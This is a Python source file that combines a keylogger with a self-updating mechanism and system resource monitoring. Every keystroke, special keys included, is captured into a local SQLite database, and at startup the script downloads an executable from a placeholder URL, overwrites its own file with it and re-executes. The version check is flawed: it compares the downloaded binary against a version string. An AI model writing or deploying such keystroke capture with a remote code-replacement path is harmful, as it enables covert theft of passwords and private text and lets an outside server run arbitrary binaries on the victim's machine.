import requests
import os
import sys
import time
from pynput.keyboard import Key, Listener
import psutil
import sqlite3
from threading import Thread

# URL where the latest .exe is hosted (this will be your update server URL)
UPDATE_URL = "https://example.com/latest_version.exe"  # Replace with your actual update URL

# Current version of the running application
CURRENT_VERSION = "1.0.0"  # Update this with your actual versioning

# Function to check if an update is available
def check_for_update():
    response = requests.get(UPDATE_URL)
    latest_version = response.text.strip()

    if latest_version != CURRENT_VERSION:
        print("Update found. Downloading the latest version...")
        download_latest_version(UPDATE_URL)

def download_latest_version(url):
    response = requests.get(url)
    with open("latest_version.exe", "wb") as f:
        f.write(response.content)

    print("Update downloaded. Replacing the old version...")
    os.remove(sys.argv[0])  # Remove the old .exe file
    os.rename("latest_version.exe", sys.argv[0])  # Replace with the new version

    print("Update complete. Restarting application...")
    os.execv(sys.argv[0], sys.argv)  # Restart with the updated .exe

# Function to set up the database connection
def create_db_connection():
    return sqlite3.connect('monitoring.db', check_same_thread=False)

# Function to initialize the database schema
def initialize_db():
    conn = create_db_connection()
    c = conn.cursor()

    # Create tables
    c.execute('''CREATE TABLE IF NOT EXISTS keys (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    key TEXT
                )''')

    c.execute('''CREATE TABLE IF NOT EXISTS system_metrics (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT,
                    cpu_usage REAL,
                    memory_usage REAL,
                    disk_usage REAL
                )''')
    conn.commit()
    conn.close()

# Function to log keystrokes
def log_keystrokes():
    conn = create_db_connection()
    c = conn.cursor()

    def on_press(key):
        try:
            char = key.char  # Get the character
            c.execute("INSERT INTO keys (key) VALUES (?)", (char,))
            conn.commit()
            print(f'Key logged: {char}')
        except AttributeError:
            # Handle special keys
            if key == Key.space:
                char = " "
            elif key == Key.enter:
                char = "\n"  # Add a new line on Enter
            else:
                char = f"[{key}]"

            c.execute("INSERT INTO keys (key) VALUES (?)", (char,))
            conn.commit()
            print(f'Special key logged: {char}')

    def on_release(key):
        if key == Key.esc:
            # Stop listener
            return False

    # Start the keylogger listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    conn.close()

# Function to monitor system metrics
def monitor_system():
    conn = create_db_connection()
    c = conn.cursor()

    while True:
        # Collect system metrics
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_usage = psutil.virtual_memory().percent
        disk_usage = psutil.disk_usage('/').percent

        # Log metrics to the database
        c.execute("INSERT INTO system_metrics (timestamp, cpu_usage, memory_usage, disk_usage) VALUES (?, ?, ?, ?) ",
                  (timestamp, cpu_usage, memory_usage, disk_usage))
        conn.commit()

        # Print metrics for reference
        print(f"{timestamp} | CPU: {cpu_usage}% | Memory: {memory_usage}% | Disk: {disk_usage}%")
        time.sleep(5)  # Adjust logging interval if needed

    conn.close()

# Initialize the database
initialize_db()

# Check for updates before starting the main application logic
check_for_update()

# Start both features as threads
if __name__ == "__main__":
    # Create and start threads for each task
    keylogger_thread = Thread(target=log_keystrokes)
    monitor_thread = Thread(target=monitor_system)

    keylogger_thread.start()
    monitor_thread.start()

    # Wait for threads to complete
    keylogger_thread.join()
    monitor_thread.join()
